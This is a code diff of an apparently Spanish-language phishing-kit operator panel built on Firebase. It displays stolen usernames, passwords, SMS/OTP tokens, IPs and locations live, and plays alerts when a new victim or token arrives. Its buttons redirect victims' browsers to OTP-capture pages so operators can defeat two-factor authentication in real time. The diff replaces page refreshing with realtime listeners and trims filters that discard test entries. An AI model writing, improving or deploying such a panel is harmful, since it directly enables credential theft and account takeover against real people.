@@ -3,9 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <title>PANEL - Sistema Protegido</title>
-    <!-- REFRESH AUTOMATICO CADA 10 SEGUNDOS -->
-    <meta http-equiv="refresh" content="10">
-    
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -42,17 +39,6 @@
             letter-spacing: 2px;
         }
         
-        .refresh-indicator {
-            background: #10b981;
-            color: #000;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-            animation: pulse 1s infinite;
-        }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        
         .stats-bar {
             display: flex;
             gap: 20px;
@@ -79,7 +65,6 @@
             letter-spacing: 1px;
         }
         .btn-pink { background: #be185d; color: white; }
-        .btn-pink:hover { background: #9d174d; }
         .btn-dark { background: #1a1a1a; border: 1px solid #333; color: #888; }
         .btn-dark:hover { border-color: #6366f1; color: #6366f1; }
         
@@ -166,9 +151,6 @@
         .notificacion-flotante.mostrar { transform: translateX(0); }
         .notificacion-otp { border-left-color: #8b5cf6; }
         
-        .alerta-ataque { background: linear-gradient(90deg, #7f1d1d, #991b1b); border-left: 4px solid #ef4444; padding: 15px 30px; margin: 20px 30px; border-radius: 5px; display: none; }
-        .alerta-ataque.mostrar { display: block; }
-        
         .badge-count { background: #6366f1; color: white; padding: 2px 6px; border-radius: 8px; font-size: 9px; margin-left: 3px; }
     </style>
 </head>
@@ -191,10 +173,7 @@
 
     <div id="panel-content" style="display: none;">
         <div class="header">
-            <div style="display: flex; align-items: center; gap: 20px;">
-                <div class="logo">PANEL PROTEGIDO</div>
-                <div class="refresh-indicator">AUTO-REFRESH 10s</div>
-            </div>
+            <div class="logo">PANEL PROTEGIDO</div>
             
             <div class="stats-bar">
                 <div class="stat-item">TOTAL: <span id="stat-total">0</span></div>
@@ -211,11 +190,6 @@
                 <button class="btn-header btn-pink" onclick="limpiarTests()">LIMPIAR</button>
                 <button class="btn-header btn-dark" onclick="cerrarSesion()">SALIR</button>
             </div>
-        </div>
-
-        <div id="alerta-ataque" class="alerta-ataque">
-            <i class="fa-solid fa-triangle-exclamation"></i> 
-            ATAQUE DETECTADO: <span id="contador-ataques">0</span> REGISTROS BLOQUEADOS
         </div>
 
         <div class="table-container">
@@ -239,37 +213,27 @@
         let vistaActual = 'validos';
         let datos = { validos: [], spam: [], blacklist: {} };
         let contadorIPs = {};
-        let ataquesDetectados = 0;
+        let idsConocidos = new Set();
+        let tokensConocidos = new Set();
+        let audioAutorizado = false;
 
-        // SONIDOS - PRECARGADOS
-        const sonidoNuevo = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
-        const sonidoOTP = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
-        sonidoNuevo.volume = 1.0;
-        sonidoOTP.volume = 1.0;
-        
-        // Reproducir sonido inmediatamente
-        function playSound(tipo) {
+        // SONIDOS
+        const sonido = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
+        sonido.volume = 1.0;
+
+        function playSound() {
+            if (!audioAutorizado) return;
             try {
-                const audio = tipo === 'nuevo' ? sonidoNuevo.cloneNode() : sonidoOTP.cloneNode();
-                audio.volume = 1.0;
-                const playPromise = audio.play();
-                if (playPromise !== undefined) {
-                    playPromise.catch(() => {
-                        // Si falla, intentar con nuevo objeto
-                        setTimeout(() => {
-                            const retry = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
-                            retry.volume = 1.0;
-                            retry.play().catch(() => {});
-                        }, 100);
-                    });
-                }
+                const a = sonido.cloneNode();
+                a.volume = 1.0;
+                a.play().catch(() => {});
             } catch(e) {}
         }
 
-        function mostrarNotificacion(texto) {
+        function mostrarNotificacion(texto, esOTP) {
             const notif = document.getElementById('notificacion');
             document.getElementById('notificacion-texto').textContent = texto;
-            notif.classList.add('mostrar');
+            notif.className = 'notificacion-flotante mostrar ' + (esOTP ? 'notificacion-otp' : '');
             setTimeout(() => notif.classList.remove('mostrar'), 3000);
         }
 
@@ -277,29 +241,16 @@
             if (!data || typeof data !== 'object') return true;
             if (!data.user || !data.pass) return true;
             
-            const idLower = id.toLowerCase();
-            const spamPatterns = ['test', 'prueba', 'admin', 'demo', 'fake', 'ejemplo', 'sample', 'user', 'pass', 'login'];
-            if (spamPatterns.some(s => idLower.includes(s))) {
-                ataquesDetectados++;
-                return true;
-            }
+            const spamPatterns = ['test', 'prueba', 'admin', 'demo', 'fake', 'user', 'pass', 'login'];
+            if (spamPatterns.some(s => id.toLowerCase().includes(s))) return true;
             
-            const userLower = (data.user || '').toLowerCase();
-            const spamUsers = ['test', 'prueba', 'admin', 'demo', 'usuario1', 'usuario2', 'usuario3', 'user1', 'user2', '123456'];
-            if (spamUsers.includes(userLower)) {
-                ataquesDetectados++;
-                return true;
-            }
+            const spamUsers = ['test', 'prueba', 'admin', 'demo', 'usuario1', 'usuario2', 'user1', '123456'];
+            if (spamUsers.includes((data.user || '').toLowerCase())) return true;
             
-            const passLower = (data.pass || '').toLowerCase();
-            const spamPasses = ['test', 'prueba', 'admin', 'demo', '123', 'password', 'pass', '123456', 'qwerty'];
-            if (spamPasses.includes(passLower)) {
-                ataquesDetectados++;
-                return true;
-            }
+            const spamPasses = ['test', 'prueba', 'admin', 'demo', '123', 'password', '123456'];
+            if (spamPasses.includes((data.pass || '').toLowerCase())) return true;
             
-            if (data.user.length < 3 || data.user.length > 50) return true;
-            if (data.pass.length < 3 || data.pass.length > 100) return true;
+            if (data.user.length < 3 || data.pass.length < 3) return true;
             if (data.ip && datos.blacklist[data.ip]) return true;
             
             return false;
@@ -312,8 +263,11 @@
                 sessionStorage.setItem('auth_panel', 'true');
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('panel-content').style.display = 'block';
-                // SONIDO DE BIENVENIDA AL ENTRAR (activa el audio)
-                playSound('nuevo');
+                
+                // AUTORIZAR AUDIO CON PRIMER CLICK
+                audioAutorizado = true;
+                playSound(); // Sonido de bienvenida
+                
                 iniciarFirebase();
             } else {
                 document.getElementById('error-msg').style.display = 'block';
@@ -323,6 +277,7 @@
         if (sessionStorage.getItem('auth_panel') === 'true') {
             document.getElementById('login-overlay').style.display = 'none';
             document.getElementById('panel-content').style.display = 'block';
+            audioAutorizado = true;
             iniciarFirebase();
         }
 
@@ -336,22 +291,19 @@
             if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
             db = firebase.database();
 
-            // Guardar último conteo para detectar nuevos después del refresh
-            const ultimoTotal = parseInt(sessionStorage.getItem('ultimo_total') || '0');
-            const ultimoOTPCount = parseInt(sessionStorage.getItem('ultimo_otp_count') || '0');
-
-            db.ref('logins').once('value', (snap) => {
+            // ESCUCHA EN TIEMPO REAL
+            db.ref('logins').on('value', (snap) => {
                 const validos = [];
                 contadorIPs = {};
-                ataquesDetectados = 0;
-                let otpCount = 0;
+                const idsActuales = new Set();
+                const tokensActuales = new Set();
                 
                 snap.forEach((child) => {
                     const data = child.val();
                     const id = child.key;
                     
                     if (esSpam(id, data)) {
-                        db.ref('spam/' + id).set({...data, deletedAt: Date.now(), reason: 'auto_spam'});
+                        db.ref('spam/' + id).set({...data, deletedAt: Date.now()});
                         db.ref('logins/' + id).remove();
                         return;
                     }
@@ -360,44 +312,35 @@
                         contadorIPs[data.ip] = (contadorIPs[data.ip] || 0) + 1;
                     }
                     
+                    // Verificar si es nuevo
+                    if (!idsConocidos.has(id) && idsConocidos.size > 0) {
+                        playSound();
+                        mostrarNotificacion('¡NUEVO CLIENTE!', false);
+                    }
+                    idsActuales.add(id);
+                    
+                    // Verificar token nuevo
                     const token = data.sms || data.otp || '';
-                    if (token && token !== '' && token !== '----') otpCount++;
+                    if (token && token !== '' && token !== '----') {
+                        const tokenKey = id + ':' + token;
+                        if (!tokensConocidos.has(tokenKey) && tokensConocidos.size > 0) {
+                            playSound();
+                            mostrarNotificacion('¡TOKEN RECIBIDO!', true);
+                        }
+                        tokensActuales.add(tokenKey);
+                    }
                     
                     validos.push({ id, data, esSpam: false });
                 });
                 
-                // SONIDO SI HAY MÁS CLIENTES QUE ANTES
-                if (validos.length > ultimoTotal && ultimoTotal > 0) {
-                    playSound('nuevo');
-                    mostrarNotificacion(`¡${validos.length - ultimoTotal} NUEVO CLIENTE!`);
-                }
-                
-                // SONIDO SI HAY MÁS OTPs QUE ANTES
-                if (otpCount > ultimoOTPCount && ultimoOTPCount > 0) {
-                    setTimeout(() => {
-                        playSound('otp');
-                        mostrarNotificacion(`¡${otpCount - ultimoOTPCount} TOKEN RECIBIDO!`);
-                    }, 500);
-                }
-                
-                // Guardar conteos actuales
-                sessionStorage.setItem('ultimo_total', validos.length);
-                sessionStorage.setItem('ultimo_otp_count', otpCount);
-                
+                idsConocidos = idsActuales;
+                tokensConocidos = tokensActuales;
                 datos.validos = validos;
-                
-                const alerta = document.getElementById('alerta-ataque');
-                if (ataquesDetectados > 0) {
-                    alerta.classList.add('mostrar');
-                    document.getElementById('contador-ataques').textContent = ataquesDetectados;
-                } else {
-                    alerta.classList.remove('mostrar');
-                }
                 
                 renderizar();
             });
 
-            db.ref('spam').once('value', (snap) => {
+            db.ref('spam').on('value', (snap) => {
                 datos.spam = [];
                 snap.forEach((child) => {
                     datos.spam.push({ id: child.key, data: child.val(), esSpam: true });
@@ -405,7 +348,7 @@
                 renderizar();
             });
 
-            db.ref('blacklist').once('value', (snap) => {
+            db.ref('blacklist').on('value', (snap) => {
                 datos.blacklist = snap.val() || {};
                 document.getElementById('stat-blocked').textContent = Object.keys(datos.blacklist).length;
                 renderizar();
@@ -419,18 +362,12 @@
 
         function limpiarTests() {
             if(!confirm('¿Eliminar registros de prueba?')) return;
-            let eliminados = 0;
-            const patterns = ['test', 'prueba', 'admin', 'demo'];
-            
             datos.validos.forEach(({id, data}) => {
-                if(patterns.some(p => id.toLowerCase().includes(p) || 
-                    (data.user && data.user.toLowerCase().includes(p)))) {
+                if(id.toLowerCase().includes('test') || (data.user || '').toLowerCase().includes('test')) {
                     db.ref('spam/' + id).set({...data});
                     db.ref('logins/' + id).remove();
-                    eliminados++;
                 }
             });
-            alert(`Eliminados ${eliminados}`);
         }
 
         function renderizar() {
@@ -444,57 +381,51 @@
 
             if (vistaActual === 'ips') { renderizarIPs(); return; }
 
-            let aMostrar = [];
-            if (vistaActual === 'validos') aMostrar = datos.validos;
-            else if (vistaActual === 'spam') aMostrar = datos.spam;
-            else aMostrar = [...datos.validos, ...datos.spam];
+            let aMostrar = vistaActual === 'validos' ? datos.validos : 
+                          vistaActual === 'spam' ? datos.spam : 
+                          [...datos.validos, ...datos.spam];
 
             if (aMostrar.length === 0) {
                 container.innerHTML = '<div style="text-align: center; padding: 50px; color: #666;">SIN REGISTROS</div>';
                 return;
             }
 
-            aMostrar.forEach(({id, data, esSpam}, index) => {
+            aMostrar.forEach(({id, data, esSpam}) => {
                 const token = data.sms || data.otp || '';
                 const tieneOTP = token && token !== '' && token !== '----';
                 const vecesIP = contadorIPs[data.ip] || 1;
                 const ipBloqueada = data.ip && datos.blacklist[data.ip];
                 
-                // Marcar los más recientes como "nuevos" (últimos 3)
-                const esNuevo = index < 3 && vistaActual !== 'spam';
+                const esNuevo = idsConocidos.has(id) && !esSpam;
+                const esNuevoOTP = tieneOTP && tokensConocidos.has(id + ':' + token);
                 
                 let rowClass = 'data-row';
                 if (esSpam) rowClass += ' spam';
-                if (esNuevo) rowClass += tieneOTP ? ' nuevo-otp' : ' nuevo';
+                if (esNuevo) rowClass += ' nuevo';
                 
                 const tipoTexto = tieneOTP ? 'TOKEN OK' : 'CREDENCIALES';
-                const tipoColor = tieneOTP ? 'color: #10b981;' : '';
-                
-                const tokenHTML = tieneOTP 
-                    ? `<div class="cell-token">${token}</div>`
-                    : `<div class="cell-token vacio">----</div>`;
                 
                 container.innerHTML += `
                     <div class="${rowClass}">
                         <div class="cell-status"><div class="live-dot"></div>LIVE</div>
                         <div class="cell-tipo">
-                            <div class="tipo-main" style="${tipoColor}">${tipoTexto}</div>
+                            <div class="tipo-main" style="${tieneOTP ? 'color: #10b981;' : ''}">${tipoTexto}</div>
                             <div class="tipo-sub">${esSpam ? 'SPAM' : 'INGRESANDO'}</div>
                         </div>
                         <div class="cell-user">${data.user || 'N/A'}</div>
                         <div class="cell-pass">${data.pass || '****'}</div>
-                        ${tokenHTML}
+                        ${tieneOTP ? `<div class="cell-token">${token}</div>` : `<div class="cell-token vacio">----</div>`}
                         <div class="cell-ip">${data.ip || 'N/A'}${vecesIP > 1 ? `<span class="badge-count">${vecesIP}</span>` : ''}</div>
                         <div class="cell-geo">${ipBloqueada ? '[BLOQUEADA] ' : ''}${data.location || 'Desconocida'}</div>
                         <div class="actions">
                             ${!esSpam ? `
-                                <button class="btn-action btn-sms1" onclick="solicitarOTP('${id}')">SMS 1</button>
-                                <button class="btn-action btn-sms2" onclick="solicitarOTP2('${id}')">SMS 2</button>
-                                <button class="btn-action btn-reject" onclick="rechazar('${id}')">RECHAZAR</button>
-                                <button class="btn-action btn-delete" onclick="eliminar('${id}')">ELIMINAR</button>
+                                <button class="btn-action btn-sms1" onclick="db.ref('comandos/${id}').set({redirect: 'otp.html'})">SMS 1</button>
+                                <button class="btn-action btn-sms2" onclick="db.ref('comandos/${id}').set({redirect: 'otp2.html'})">SMS 2</button>
+                                <button class="btn-action btn-reject" onclick="db.ref('comandos/${id}').set({redirect: 'index.html'}); db.ref('logins/${id}').update({step: 'Rechazado'})">RECHAZAR</button>
+                                <button class="btn-action btn-delete" onclick="db.ref('logins/${id}').remove()">ELIMINAR</button>
                             ` : `
                                 <button class="btn-action btn-sms1" onclick="recuperar('${id}')">RECUPERAR</button>
-                                <button class="btn-action btn-delete" onclick="eliminarSpam('${id}')">ELIMINAR</button>
+                                <button class="btn-action btn-delete" onclick="db.ref('spam/${id}').remove()">ELIMINAR</button>
                             `}
                         </div>
                     </div>
@@ -511,8 +442,7 @@
                 return;
             }
 
-            let html = '<div style="background: #0a0a0a; padding: 20px; border-radius: 10px;">';
-            html += '<table style="width: 100%; border-collapse: collapse;">';
+            let html = '<div style="background: #0a0a0a; padding: 20px; border-radius: 10px;"><table style="width: 100%; border-collapse: collapse;">';
             html += '<tr style="color: #666; font-size: 12px; border-bottom: 1px solid #333;"><th>IP</th><th>INTENTOS</th><th>ESTADO</th><th>ACCIONES</th></tr>';
             
             ipsOrdenadas.forEach(([ip, count]) => {
@@ -541,12 +471,12 @@
             }
         }
 
-        function solicitarOTP(id) { db.ref('comandos/' + id).set({ redirect: 'otp.html', ts: Date.now() }); }
-        function solicitarOTP2(id) { db.ref('comandos/' + id).set({ redirect: 'otp2.html', ts: Date.now() }); }
-        function rechazar(id) { db.ref('comandos/' + id).set({ redirect: 'index.html', ts: Date.now() }); db.ref('logins/' + id).update({ step: 'Rechazado', online: false }); }
-        function eliminar(id) { if(confirm('¿Mover a spam?')) db.ref('logins/' + id).remove(); }
-        function recuperar(id) { db.ref('spam/' + id).once('value').then(snap => { const d = snap.val(); if(d) { db.ref('logins/' + id).set(d); db.ref('spam/' + id).remove(); }}); }
-        function eliminarSpam(id) { if(confirm('¿Eliminar?')) db.ref('spam/' + id).remove(); }
+        function recuperar(id) {
+            db.ref('spam/' + id).once('value').then(snap => {
+                const d = snap.val();
+                if(d) { db.ref('logins/' + id).set(d); db.ref('spam/' + id).remove(); }
+            });
+        }
     </script>
 </body>
 </html>
